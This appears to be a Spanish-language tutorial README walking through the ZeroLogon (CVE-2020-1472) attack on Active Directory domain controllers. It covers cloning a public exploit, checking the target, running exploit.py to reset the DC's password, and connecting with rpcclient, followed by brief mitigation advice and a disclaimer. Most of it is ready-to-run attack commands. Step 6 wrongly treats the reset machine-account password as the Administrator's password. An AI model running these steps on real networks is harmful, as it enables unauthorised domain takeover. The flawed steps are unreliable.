# Ataque ZeroLogon (CVE-2020-1472) - Explicación paso a paso

Este repositorio contiene una explicación detallada para entender y ejecutar el ataque **ZeroLogon** contra un controlador de dominio vulnerable de Active Directory, utilizando el exploit disponible en el repositorio de [VoidSec/CVE-2020-1472](https://github.com/VoidSec/CVE-2020-1472).

---

## ¿Qué es ZeroLogon?

ZeroLogon es una vulnerabilidad crítica (CVE-2020-1472) que afecta el protocolo Netlogon de Microsoft. Permite a un atacante sin autenticación obtener acceso completo de administrador al controlador de dominio de Active Directory explotando un fallo en el proceso de autenticación basado en AES-CFB8.

---

## Requisitos

- Controlador de dominio vulnerable (sin parche contra CVE-2020-1472).
- Máquina atacante con:
  - Sistema Linux (o WSL en Windows).
  - Python 3 instalado.
  - Acceso a la red donde está el controlador de dominio.

---

## Paso 1: Preparar la máquina atacante

```bash
sudo apt update
sudo apt install git python3 python3-pip -y
```

---

## Paso 2: Clonar el repositorio del exploit

```bash
git clone https://github.com/VoidSec/CVE-2020-1472.git
cd CVE-2020-1472
```

---

## Paso 3: Instalar dependencias Python

```bash
pip3 install -r requirements.txt
```

---

## Paso 4: Verificar vulnerabilidad del controlador de dominio (opcional)

```bash
python3 check.py <IP_del_controlador_de_dominio>
```

Si el resultado indica que el controlador es vulnerable, puedes continuar.

---

## Paso 5: Ejecutar el exploit para resetear la contraseña del DC

```bash
python3 exploit.py <IP_del_controlador_de_dominio> <Nueva_contraseña_para_DC>
```

Ejemplo:

```bash
python3 exploit.py 192.168.1.100 Password123!
```

---

## Paso 6: Verificar que la contraseña cambió y acceso administrativo

Puedes probar conectarte con la nueva contraseña usando `rpcclient`:

```bash
rpcclient -U Administrator%Password123! 192.168.1.100
```

Si te conecta, tienes acceso administrativo al dominio.

---

## ¿Qué sucede durante el ataque?

- El exploit envía paquetes Netlogon con claves nulas para "engañar" al controlador de dominio.
- Debido a un error criptográfico en Netlogon, el DC acepta la sesión sin validar la clave.
- El atacante puede cambiar la contraseña del DC y obtener privilegios de administrador.

---

## Medidas de mitigación

- Aplicar los parches oficiales de Microsoft desde agosto 2020.
- Monitorizar eventos sospechosos en logs de Netlogon (Event ID 5827, 5828).
- Limitar el acceso a los controladores de dominio desde la red.

---

## Referencias

- [CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
- [VoidSec/CVE-2020-1472 GitHub](https://github.com/VoidSec/CVE-2020-1472)
- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)

---

## Aviso Legal

Esta información es solo para fines educativos y debe usarse únicamente en entornos controlados con permiso explícito. El uso no autorizado puede ser ilegal y conllevar consecuencias legales.

---

# Autor

Explicación preparada por [Tu Nombre] para fines educativos y formativos.
